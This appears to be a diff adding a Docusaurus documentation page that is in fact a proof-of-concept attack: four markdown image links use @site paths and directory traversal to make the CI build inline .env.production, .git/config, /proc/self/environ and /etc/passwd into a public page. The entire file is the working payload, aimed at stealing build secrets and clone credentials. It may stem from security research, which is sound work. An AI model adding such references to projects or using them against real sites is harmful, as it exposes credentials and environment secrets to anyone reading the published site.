@@ -1,0 +1,21 @@
+---
+sidebar_position: 99
+title: escalation-max-impact
+---
+
+# Escalation PoC — arbitrary file read beyond the site dir
+
+The four images below resolve, on the CI build runner, to files **outside the
+published site** and Docusaurus inlines their bytes into this public page:
+
+1. CI secret-as-file pattern (repo `.env.production`):
+![secret-env](@site/.env.production)
+
+2. Cloned repo git config (clone credentials live here on CI):
+![git-config](@site/.git/config)
+
+3. Build process environment (every CI env var / secret the build can see):
+![proc-environ](@site/../../../../../../proc/self/environ)
+
+4. Arbitrary host OS file (proves it is not limited to repo files):
+![etc-passwd](@site/../../../../../../etc/passwd)
